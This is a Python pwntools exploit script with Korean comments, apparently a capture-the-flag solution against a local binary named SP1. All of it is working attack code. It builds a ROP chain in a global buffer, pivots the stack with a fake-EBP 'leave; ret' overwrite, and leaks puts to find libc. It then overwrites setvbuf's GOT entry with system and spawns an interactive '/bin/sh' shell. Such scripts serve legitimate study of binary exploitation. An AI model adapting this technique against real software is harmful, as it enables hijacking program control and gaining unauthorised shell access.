from pwn import *

# 대상 프로그램 실행
p = process('./SP1')

# 가젯 주소 정의
pop_rdi_ret = 0x401293      # pop rdi; ret 가젯
pop_rsi_r15_ret = 0x401291  # pop rsi; pop r15; ret 가젯
pop_rdx_ret = 0x40119e      # pop rdx; ret 가젯
leave_ret = 0x40121f        # leave; ret 가젯

# PLT와 GOT 주소 정의
puts_plt = 0x401070         # puts 함수의 PLT 주소
puts_got = 0x404018         # puts 함수의 GOT 주소
read_plt = 0x401090         # read 함수의 PLT 주소
setvbuf_plt = 0x4010a0      # setvbuf 함수의 PLT 주소
setvbuf_got = 0x404030      # setvbuf 함수의 GOT 주소
name = 0x404080             # 전역 변수 name의 주소

# 첫 번째 페이로드 구성 (name 변수에 ROP 체인 구성)
payload = b'A' * 0x700      # name 변수에 0x700 바이트의 'A' 문자로 채움
payload += p64(0)           # rbp를 0으로 설정
payload += p64(pop_rdi_ret) # pop rdi; ret 가젯 추가
payload += p64(puts_got)    # puts의 GOT 주소를 rdi에 설정
payload += p64(puts_plt)    # puts 함수 호출
payload += p64(pop_rdi_ret) # pop rdi; ret 가젯 추가
payload += p64(0)           # rdi를 0으로 설정 (stdin)
payload += p64(pop_rsi_r15_ret) # pop rsi; pop r15; ret 가젯 추가
payload += p64(setvbuf_got) # setvbuf의 GOT 주소를 rsi에 설정
payload += p64(0)           # r15를 0으로 설정
payload += p64(pop_rdx_ret) # pop rdx; ret 가젯 추가
payload += p64(16)          # rdx를 16으로 설정 (읽을 바이트 수)
payload += p64(read_plt)    # read 함수 호출
payload += p64(pop_rdi_ret) # pop rdi; ret 가젯 추가
payload += p64(setvbuf_got + 8) # setvbuf의 GOT 주소 + 8을 rdi에 설정
payload += p64(setvbuf_plt) # setvbuf 함수 호출

# 첫 번째 페이로드 전송
p.sendafter(b'name?: ', payload)

# 두 번째 페이로드 구성 (Fake EBP 공격)
payload = b'A' * 0x20       # comment 버퍼에 0x20 바이트의 'A' 문자로 채움
payload += p64(name + 0x700) # SFP를 name+0x700으로 설정
payload += p64(leave_ret)   # RET에 leave; ret 가젯 설정

# 두 번째 페이로드 전송
p.sendafter(b'comment?: ', payload)

# puts의 실제 주소 수신 및 파싱
p.recvline()               # "thank you for your comment :)" 메시지 수신
puts_libc = u64(p.recvn(6) + b'\x00\x00') # puts의 실제 주소 추출
libc_base = puts_libc - 0x84420 # libc 베이스 주소 계산
system_libc = libc_base + 0x52290 # system 함수의 실제 주소 계산

# 디버깅 정보 출력
print('puts_libc: ', hex(puts_libc))
print('libc_base: ', hex(libc_base))
print('system_libc: ', hex(system_libc))

# 최종 페이로드 구성 및 전송
payload = p64(system_libc)  # system 함수 주소
payload += b'/bin/sh\x00'   # /bin/sh 문자열
p.send(payload)            # 최종 페이로드 전송

# 대화형 모드 시작
p.interactive()
